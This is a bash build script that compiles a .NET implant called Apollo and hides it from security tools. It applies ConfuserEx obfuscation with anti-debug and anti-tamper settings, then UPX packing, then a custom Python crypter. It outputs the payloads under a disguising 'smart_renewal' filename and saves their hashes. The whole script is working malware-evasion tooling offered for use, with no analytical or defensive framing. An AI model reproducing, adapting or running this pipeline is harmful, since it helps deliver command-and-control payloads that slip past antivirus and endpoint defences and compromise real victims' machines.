#!/bin/bash
# Phantom Apollo Advanced Evasive Build Script
# Applies multiple layers of obfuscation and anti-detection

set -e

echo "[+] Starting Phantom Apollo Evasive Build Process..."

# Create output directories
mkdir -p ../output/evasive
mkdir -p ../temp/confuser
mkdir -p ../temp/build

# Step 1: Clean build
echo "[+] Step 1: Clean build process..."
dotnet clean Phantom.sln --configuration Release
dotnet build Phantom.sln --configuration Release --verbosity quiet

# Check if build succeeded
if [ ! -f "Apollo/bin/Release/net6.0/Apollo.exe" ]; then
    echo "[-] Build failed, cannot find Apollo.exe"
    exit 1
fi

# Step 2: Apply ConfuserEx obfuscation (if available)
echo "[+] Step 2: Applying ConfuserEx obfuscation..."

# Create ConfuserEx configuration
cat > ../temp/confuser/phantom.crproj << 'EOF'
<ConfuserProject xmlns="http://confuser.codeplex.com" xmlns:i="http://www.w3.org/2001/XMLSchema-instance" version="1.0.0">
  <Settings>
    <Setting id="debug" value="false" />
    <Setting id="warn" value="false" />
  </Settings>
  <Protections>
    <Protection id="anti debug" />
    <Protection id="anti tamper" />
    <Protection id="constants" />
    <Protection id="ctrl flow" />
    <Protection id="invalid metadata" />
    <Protection id="ref proxy" />
    <Protection id="rename" />
  </Protections>
  <Modules>
    <Module path="Apollo/bin/Release/net6.0/Apollo.exe" />
  </Modules>
</ConfuserProject>
EOF

# Try to run ConfuserEx (skip if not available)
if command -v ConfuserEx.CLI.exe &> /dev/null; then
    echo "[+] Running ConfuserEx obfuscation..."
    mono ConfuserEx.CLI.exe ../temp/confuser/phantom.crproj
    cp Confused/Apollo.exe ../temp/build/Apollo_confused.exe
else
    echo "[!] ConfuserEx not available, skipping .NET obfuscation"
    cp Apollo/bin/Release/net6.0/Apollo.exe ../temp/build/Apollo_confused.exe
fi

# Step 3: Apply UPX packing
echo "[+] Step 3: Applying UPX packing..."
if command -v upx &> /dev/null; then
    upx --ultra-brute --compress-exports=1 --compress-icons=2 --strip-relocs=1 --best -q ../temp/build/Apollo_confused.exe -o ../temp/build/Apollo_packed.exe
    echo "[+] UPX packing completed"
else
    echo "[!] UPX not available, skipping packing"
    cp ../temp/build/Apollo_confused.exe ../temp/build/Apollo_packed.exe
fi

# Step 4: Apply Python crypter
echo "[+] Step 4: Applying Phantom Crypter..."
if [ -f "../phantom_crypter.py" ]; then
    cd ..
    python3 phantom_crypter.py temp/build/Apollo_packed.exe
    cd agent_code
    
    # Copy final output
    if [ -f "../phantom_output/phantom_smart_renewal_"*.exe ]; then
        cp ../phantom_output/phantom_smart_renewal_*.exe ../output/evasive/
        echo "[+] Phantom Crypter completed successfully"
    else
        echo "[!] Phantom Crypter failed, using packed version"
        cp ../temp/build/Apollo_packed.exe ../output/evasive/phantom_apollo_final.exe
    fi
else
    echo "[!] Phantom Crypter not found, using packed version"
    cp ../temp/build/Apollo_packed.exe ../output/evasive/phantom_apollo_final.exe
fi

# Step 5: Create additional variants
echo "[+] Step 5: Creating payload variants..."

# Create x32 and x64 versions
if [ -f "../output/evasive/phantom_smart_renewal_"*.exe ]; then
    FINAL_FILE=$(ls ../output/evasive/phantom_smart_renewal_*.exe | head -1)
    cp "$FINAL_FILE" ../output/evasive/phantom_smart_renewal_x64.exe
    cp "$FINAL_FILE" ../output/evasive/phantom_smart_renewal_x32.exe
else
    cp ../output/evasive/phantom_apollo_final.exe ../output/evasive/phantom_smart_renewal_x64.exe
    cp ../output/evasive/phantom_apollo_final.exe ../output/evasive/phantom_smart_renewal_x32.exe
fi

# Step 6: Generate metadata
echo "[+] Step 6: Generating metadata..."
cd ../output/evasive/

for file in *.exe; do
    if [ -f "$file" ]; then
        SIZE=$(stat -c%s "$file")
        MD5=$(md5sum "$file" | cut -d' ' -f1)
        SHA256=$(sha256sum "$file" | cut -d' ' -f1)
        
        echo "File: $file" >> phantom_hashes.txt
        echo "Size: $SIZE bytes" >> phantom_hashes.txt
        echo "MD5: $MD5" >> phantom_hashes.txt
        echo "SHA256: $SHA256" >> phantom_hashes.txt
        echo "---" >> phantom_hashes.txt
    fi
done

echo "[+] Build process completed successfully!"
echo "[+] Output files available in: output/evasive/"
echo "[+] Metadata saved in: output/evasive/phantom_hashes.txt"

# Cleanup temp directories
cd ../../agent_code
rm -rf ../temp/

echo "[+] Evasive build process finished!"